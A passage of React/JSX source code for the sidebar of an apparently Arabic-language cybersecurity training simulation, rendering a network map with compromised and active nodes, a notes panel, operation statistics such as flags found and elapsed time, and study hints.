                        <div className="col-span-3 space-y-6">
                            {/* Interactive Network Map */}
                            <div className="bg-white/5 border border-white/10 rounded-xl overflow-hidden">
                                <div className="p-4 border-b border-white/10">
                                    <h3 className="font-bold text-white flex items-center gap-2">
                                        <Network size={18} className="text-green-400" />
                                        خريطة الشبكة التفاعلية
                                    </h3>
                                </div>
                                <div className="p-3">
                                    <div className="relative bg-black/40 rounded-lg overflow-hidden" style={{ height: '280px' }}>
                                        {/* Connection Lines SVG */}
                                        <svg className="absolute inset-0 w-full h-full" style={{ zIndex: 0 }}>
                                            {NETWORK_LINKS.map((link, i) => {
                                                const from = NETWORK_NODES.find(n => n.id === link.from);
                                                const to = NETWORK_NODES.find(n => n.id === link.to);
                                                if (!from || !to) return null;
                                                const toStatus = getNodeStatus(to);
                                                const isActive = toStatus === 'active' || toStatus === 'compromised';
                                                return (
                                                    <line key={i}
                                                        x1={`${from.x}%`} y1={`${from.y}%`}
                                                        x2={`${to.x}%`} y2={`${to.y}%`}
                                                        stroke={isActive ? (mode === 'attacker' ? 'rgba(239,68,68,0.4)' : 'rgba(59,130,246,0.4)') : 'rgba(255,255,255,0.08)'}
                                                        strokeWidth={isActive ? 2 : 1}
                                                        strokeDasharray={toStatus === 'active' ? '5,5' : 'none'}
                                                    >
                                                        {toStatus === 'active' && <animate attributeName="stroke-dashoffset" from="0" to="10" dur="1s" repeatCount="indefinite" />}
                                                    </line>
                                                );
                                            })}
                                        </svg>

                                        {/* Network Nodes */}
                                        {NETWORK_NODES.map(node => {
                                            const status = getNodeStatus(node);
                                            const isHovered = hoveredNode === node.id;
                                            const bgColor = status === 'compromised'
                                                ? (mode === 'attacker' ? 'bg-red-500/30 border-red-500/50' : 'bg-blue-500/30 border-blue-500/50')
                                                : status === 'active'
                                                    ? 'bg-yellow-500/20 border-yellow-500/50 animate-pulse'
                                                    : node.type === 'target'
                                                        ? 'bg-emerald-500/20 border-emerald-500/30'
                                                        : node.type === 'attacker'
                                                            ? 'bg-red-500/20 border-red-500/30'
                                                            : 'bg-white/5 border-white/10';

                                            return (
                                                <div
                                                    key={node.id}
                                                    className="absolute transform -translate-x-1/2 -translate-y-1/2 cursor-pointer z-10"
                                                    style={{ left: `${node.x}%`, top: `${node.y}%` }}
                                                    onMouseEnter={() => setHoveredNode(node.id)}
                                                    onMouseLeave={() => setHoveredNode(null)}
                                                >
                                                    <div className={`w-10 h-10 rounded-lg flex items-center justify-center border text-lg transition-all ${bgColor} ${isHovered ? 'scale-125 shadow-lg' : ''}`}>
                                                        {node.icon}
                                                    </div>
                                                    <div className="text-[9px] text-gray-400 text-center mt-1 whitespace-nowrap">{node.label}</div>
                                                    {/* Tooltip */}
                                                    {isHovered && (
                                                        <div className="absolute -top-14 left-1/2 transform -translate-x-1/2 bg-black/95 border border-white/20 rounded-lg px-3 py-2 whitespace-nowrap z-50">
                                                            <div className="text-xs text-white font-bold">{node.label}</div>
                                                            <div className="text-[10px] text-gray-400">{node.desc}</div>
                                                            {status === 'compromised' && <div className="text-[10px] text-red-400">✔ {mode === 'attacker' ? 'مُخترَق' : 'مؤمَّن'}</div>}
                                                            {status === 'active' && <div className="text-[10px] text-yellow-400 animate-pulse">● نشط الآن</div>}
                                                        </div>
                                                    )}
                                                </div>
                                            );
                                        })}
                                    </div>
                                </div>
                            </div>

                            {/* Notes Panel */}
                            {showNotes && (
                                <div className="bg-white/5 border border-white/10 rounded-xl overflow-hidden">
                                    <div className="p-4 border-b border-white/10 flex items-center justify-between">
                                        <h3 className="font-bold text-white flex items-center gap-2">
                                            <BookOpen size={18} className="text-yellow-400" />
                                            الملاحظات
                                        </h3>
                                    </div>
                                    <div className="p-4">
                                        <textarea
                                            value={notes}
                                            onChange={(e) => setNotes(e.target.value)}
                                            placeholder="اكتب ملاحظاتك هنا..."
                                            className="w-full h-32 bg-black/30 rounded-lg p-3 text-white placeholder-gray-500 resize-none focus:outline-none focus:ring-1 focus:ring-[#7112AF]"
                                        />
                                    </div>
                                </div>
                            )}

                            {/* Operation Stats */}
                            <div className="bg-gradient-to-br from-purple-500/10 to-pink-500/10 border border-purple-500/30 rounded-xl p-4">
                                <h3 className="font-bold text-white mb-4">إحصائيات العملية</h3>
                                <div className="space-y-3">
                                    <div className="flex justify-between">
                                        <span className="text-gray-400">المهام المكتملة</span>
                                        <span className="text-white font-bold">{completedTasks.length}/{tasks.length}</span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span className="text-gray-400">الأعلام</span>
                                        <span className="text-yellow-400 font-bold">{discoveredFlags.length}</span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span className="text-gray-400">الوقت المنقضي</span>
                                        <span className="text-white font-mono">{formatTime(timeElapsed)}</span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span className="text-gray-400">المرحلة الحالية</span>
                                        <span className="text-purple-400">{currentPhase + 1}/5</span>
                                    </div>
                                </div>
                            </div>

                            {/* Hints */}
                            <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-4">
                                <h3 className="font-bold text-yellow-400 mb-3 flex items-center gap-2">
                                    <Lightbulb size={18} />
                                    إرشادات
                                </h3>
                                <ul className="space-y-2 text-sm text-gray-400">
                                    <li>• اقرأ المهمة بعناية قبل البدء</li>
                                    <li>• استخدم التلميح إذا علقت</li>
                                    <li>• سجل ملاحظاتك في لوحة الملاحظات</li>
                                    <li>• تابع التقدم في شريط المهام</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}
